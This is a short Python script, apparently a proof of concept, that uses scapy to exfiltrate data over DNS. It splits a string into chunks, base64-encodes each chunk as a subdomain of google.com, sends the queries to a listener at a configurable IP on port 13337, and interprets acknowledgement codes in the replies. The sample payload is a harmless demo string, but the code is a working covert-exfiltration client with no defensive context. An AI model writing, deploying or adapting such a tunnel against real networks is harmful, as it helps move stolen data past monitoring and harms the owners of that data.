from scapy.layers.inet import IP, UDP
from scapy.packet import Packet
from scapy.layers.dns import DNS, DNSQR
from scapy.sendrecv import sr1

from scapy.all import *  # noqa: F403
from base64 import b64encode

ip = ""
port = 13337
domain = "google.com"


def process(response: Packet):
    if response.haslayer(DNS) and response[DNS].ancount > 0:
        code = str(response[DNS].an.rdata)[-1]
        if int(code) == 1:
            print("Received Successfully.")
        elif int(code) == 2:
            print("Acknowledged end transmission")
        else:
            print("Transmission Error")


def DNSRequest(sub_domain):
    global domain
    d = bytes(f"{sub_domain}.{domain}", "utf-8")
    query = DNSQR(qname=d)
    p = IP(dst=bytes(ip, "utf-8")) / UDP(dport=port) / DNS(qd=query)
    result = sr1(p, verbose=False)
    process(result)


chunk_length = 12


def sendData(data):
    for i in range(0, len(data), chunk_length):
        chunk = data[i : min(i + chunk_length, len(data))]
        print(f"Transmitting {chunk}")
        encoded = b64encode(bytes(chunk, "utf-8"))
        DNSRequest(encoded)


data = "This data is being exfiltrated over DNS"
sendData(data)
data = "R"
sendData(data)
